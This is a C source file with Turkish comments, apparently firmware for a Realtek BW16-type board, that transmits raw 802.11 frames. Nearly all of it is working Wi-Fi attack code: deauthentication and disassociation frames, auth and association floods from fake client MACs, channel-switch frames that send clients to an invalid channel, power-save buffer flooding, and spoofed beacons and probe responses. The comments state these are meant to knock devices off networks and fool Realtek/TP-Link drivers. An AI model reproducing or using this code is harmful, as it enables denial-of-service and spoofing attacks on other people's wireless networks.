#include "wifi_cust_tx.h"

/*
 * Ham 802.11 frame iletimi.
 * - FCS (4 byte) donanım tarafından otomatik eklenir — dahil etme.
 * - Sequence number donanım tarafından ayarlanır — 0 bırak.
 * - rltk_wlan_info → WLAN0 (STA/inject arayüzü).
 *   WiFi.apbegin() her zaman WLAN1 kullanır → wext_set_channel(WLAN0_NAME) AP'yi ETKİLEMEZ.
 */
void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

/*
 * Deauth frame (0xC0) — tüm platformlara karşı etkili, PMF olmaksızın.
 */
void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source,       src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination,  dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

/*
 * Disassoc frame (0xA0) — iOS + Android'i tam yeniden bağlanmaya zorlar.
 */
void wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source,       src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination,  dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DisassocFrame));
}

/*
 * Auth Request (0xB0) — PMF'den muaf, AP association tablosunu flood eder.
 */
void wifi_tx_auth_frame(void* ap_mac, void* fake_client_mac) {
  AuthReqFrame frame;
  memcpy(&frame.destination,  ap_mac,          6);
  memcpy(&frame.source,       fake_client_mac, 6);
  memcpy(&frame.access_point, ap_mac,          6);
  wifi_tx_raw_frame(&frame, sizeof(AuthReqFrame));
}

/*
 * Association Request (0x0000) — Auth flood ile birlikte AP slotlarını kilitler.
 */
void wifi_tx_assoc_frame(void* ap_mac, void* fake_client_mac) {
  AssocReqFrame frame;
  memcpy(&frame.destination,  ap_mac,          6);
  memcpy(&frame.source,       fake_client_mac, 6);
  memcpy(&frame.access_point, ap_mac,          6);
  wifi_tx_raw_frame(&frame, sizeof(AssocReqFrame));
}

/*
 * CSA Action frame (0xD0) — istemcileri geçersiz kanala yönlendirir.
 */
void wifi_tx_csa_frame(void* ap_mac, uint8_t new_channel) {
  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  CSAFrame frame;
  memcpy(&frame.destination,  broadcast, 6);
  memcpy(&frame.source,       ap_mac,    6);
  memcpy(&frame.access_point, ap_mac,    6);
  frame.new_channel = new_channel;
  wifi_tx_raw_frame(&frame, sizeof(CSAFrame));
}

/*
 * Null Data frame (PM=1) — AP'nin power-save buffer'ını doldurur (iOS saldırısı).
 */
void wifi_tx_null_frame(void* ap_mac, void* fake_client_mac) {
  NullDataFrame frame;
  memcpy(&frame.destination,  ap_mac,          6);
  memcpy(&frame.source,       fake_client_mac, 6);
  memcpy(&frame.access_point, ap_mac,          6);
  wifi_tx_raw_frame(&frame, sizeof(NullDataFrame));
}

/*
 * ─── Beacon Frame — Standart Uyumlu (Evil-BW16 + IEEE 802.11-2020 referansı) ──
 *
 * Araştırma bulgusu (deepwiki.com/7h30th3r0n3/Evil-BW16, tesa-klebeband):
 * Sadece SSID IE içeren beacon'lar pek çok istemci tarafından görmezden gelinir.
 * Aşağıdaki IE'ler ZORUNLUDUR:
 *
 *   IE 0x00 — SSID
 *   IE 0x01 — Supported Rates (2.4GHz ve 5GHz için farklı set)
 *   IE 0x03 — DS Parameter Set (kanal numarası — 5GHz için KRİTİK)
 *
 * 2.4GHz Supported Rates: 1, 2, 5.5, 11 Mbps (basic) + 6, 9, 12, 18 Mbps
 * 5GHz Supported Rates:   6, 12, 24 Mbps (basic) + 9, 18, 36, 48, 54 Mbps
 *
 * Frame dinamik olarak heap kullanmadan stack üzerinde oluşturulur.
 * FCS (4 byte) donanım tarafından otomatik eklenir.
 */
void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char* ssid, uint8_t channel) {
  uint8_t frame[128];
  int pos = 0;

  // ── MAC Header (24 byte) ──────────────────────────────────────────────────
  frame[pos++] = 0x80; frame[pos++] = 0x00; // Frame Control: Beacon
  frame[pos++] = 0x00; frame[pos++] = 0x00; // Duration
  memcpy(frame + pos, dst_mac, 6); pos += 6; // Addr1: Destination
  memcpy(frame + pos, src_mac, 6); pos += 6; // Addr2: Source (BSSID)
  memcpy(frame + pos, src_mac, 6); pos += 6; // Addr3: BSSID
  frame[pos++] = 0x00; frame[pos++] = 0x00; // Sequence Control

  // ── Fixed Parameters (12 byte) ───────────────────────────────────────────
  // Timestamp (8 byte, 0 — donanım güncelleyebilir)
  for (int i = 0; i < 8; i++) frame[pos++] = 0x00;
  // Beacon Interval: 100 TU = 102.4ms
  frame[pos++] = 0x64; frame[pos++] = 0x00;
  // Capability Info: ESS + Short Preamble + Short Slot Time = 0x0431
  frame[pos++] = 0x31; frame[pos++] = 0x04;

  // ── Information Elements ─────────────────────────────────────────────────

  // IE 0x00 — SSID
  uint8_t ssid_len = 0;
  while (ssid[ssid_len] != '\0' && ssid_len < 32) ssid_len++;
  frame[pos++] = 0x00;      // Tag: SSID
  frame[pos++] = ssid_len;
  memcpy(frame + pos, ssid, ssid_len); pos += ssid_len;

  // IE 0x01 — Supported Rates
  bool is5g = (channel >= 36);
  if (!is5g) {
    // 2.4GHz: 1(B), 2(B), 5.5(B), 11(B), 6, 9, 12, 18 Mbps
    // MSB=1 → basic rate; değer = rate * 2 (500 Kbps birim)
    frame[pos++] = 0x01; // Tag: Supported Rates
    frame[pos++] = 0x08; // Length: 8 rates
    frame[pos++] = 0x82; // 1 Mbps  (basic)
    frame[pos++] = 0x84; // 2 Mbps  (basic)
    frame[pos++] = 0x8B; // 5.5 Mbps(basic)
    frame[pos++] = 0x96; // 11 Mbps (basic)
    frame[pos++] = 0x0C; // 6 Mbps
    frame[pos++] = 0x12; // 9 Mbps
    frame[pos++] = 0x18; // 12 Mbps
    frame[pos++] = 0x24; // 18 Mbps
  } else {
    // 5GHz: 6(B), 12(B), 24(B), 9, 18, 36, 48, 54 Mbps
    frame[pos++] = 0x01; // Tag: Supported Rates
    frame[pos++] = 0x08; // Length: 8 rates
    frame[pos++] = 0x8C; // 6 Mbps  (basic)
    frame[pos++] = 0x98; // 12 Mbps (basic)
    frame[pos++] = 0xB0; // 24 Mbps (basic)
    frame[pos++] = 0x12; // 9 Mbps
    frame[pos++] = 0x24; // 18 Mbps
    frame[pos++] = 0x48; // 36 Mbps
    frame[pos++] = 0x60; // 48 Mbps
    frame[pos++] = 0x6C; // 54 Mbps
  }

  // IE 0x03 — DS Parameter Set (kanal numarası — 5GHz için KRİTİK)
  // Bu IE olmadan 5GHz istemcileri beacon'ı yok sayabilir.
  frame[pos++] = 0x03; // Tag: DS Parameter Set
  frame[pos++] = 0x01; // Length: 1 byte
  frame[pos++] = channel;

  wifi_tx_raw_frame(frame, pos);
}

/*
 * ─── Probe Response — Standart Uyumlu ────────────────────────────────────────
 *
 * Realtek/TP-Link sürücü saldırısı:
 *   capabilities = 0x0001 (ESS only, WPA/WPA2/WPA3 flag YOK)
 *   → Sürücü "AP güvenliği kaldırdı" sanır → keser → deauth bloğu devreye girer.
 *
 * Araştırma bulgusu: Supported Rates + DS Parameter Set IE eklenmesi
 * Realtek sürücüsünün probe response'ı geçerli sayması için gereklidir.
 * Eksik IE'lerle bazı sürücüler frame'i görmezden gelir.
 */
void wifi_tx_probe_resp_frame(void* ap_mac, const char* ssid, uint8_t channel) {
  static uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t frame[128];
  int pos = 0;

  // ── MAC Header (24 byte) ──────────────────────────────────────────────────
  frame[pos++] = 0x50; frame[pos++] = 0x00; // Frame Control: Probe Response
  frame[pos++] = 0xFF; frame[pos++] = 0xFF; // Duration
  memcpy(frame + pos, broadcast, 6); pos += 6; // Addr1: broadcast
  memcpy(frame + pos, ap_mac,    6); pos += 6; // Addr2: Source (spoofed AP)
  memcpy(frame + pos, ap_mac,    6); pos += 6; // Addr3: BSSID
  frame[pos++] = 0x00; frame[pos++] = 0x00; // Sequence Control

  // ── Fixed Parameters (12 byte) ───────────────────────────────────────────
  for (int i = 0; i < 8; i++) frame[pos++] = 0x00; // Timestamp
  frame[pos++] = 0x64; frame[pos++] = 0x00; // Beacon Interval: 100 TU
  // Capability: 0x0001 = ESS only — NO Privacy/WPA/RSN → sürücüyü yanıltır
  frame[pos++] = 0x01; frame[pos++] = 0x00;

  // ── Information Elements ─────────────────────────────────────────────────

  // IE 0x00 — SSID
  uint8_t ssid_len = 0;
  if (ssid != nullptr) {
    while (ssid[ssid_len] != '\0' && ssid_len < 32) ssid_len++;
  }
  frame[pos++] = 0x00;
  frame[pos++] = ssid_len;
  if (ssid_len > 0) { memcpy(frame + pos, ssid, ssid_len); pos += ssid_len; }

  // IE 0x01 — Supported Rates
  bool is5g = (channel >= 36);
  if (!is5g) {
    frame[pos++] = 0x01; frame[pos++] = 0x08;
    frame[pos++] = 0x82; frame[pos++] = 0x84;
    frame[pos++] = 0x8B; frame[pos++] = 0x96;
    frame[pos++] = 0x0C; frame[pos++] = 0x12;
    frame[pos++] = 0x18; frame[pos++] = 0x24;
  } else {
    frame[pos++] = 0x01; frame[pos++] = 0x08;
    frame[pos++] = 0x8C; frame[pos++] = 0x98;
    frame[pos++] = 0xB0; frame[pos++] = 0x12;
    frame[pos++] = 0x24; frame[pos++] = 0x48;
    frame[pos++] = 0x60; frame[pos++] = 0x6C;
  }

  // IE 0x03 — DS Parameter Set
  frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = channel;

  wifi_tx_raw_frame(frame, pos);
}
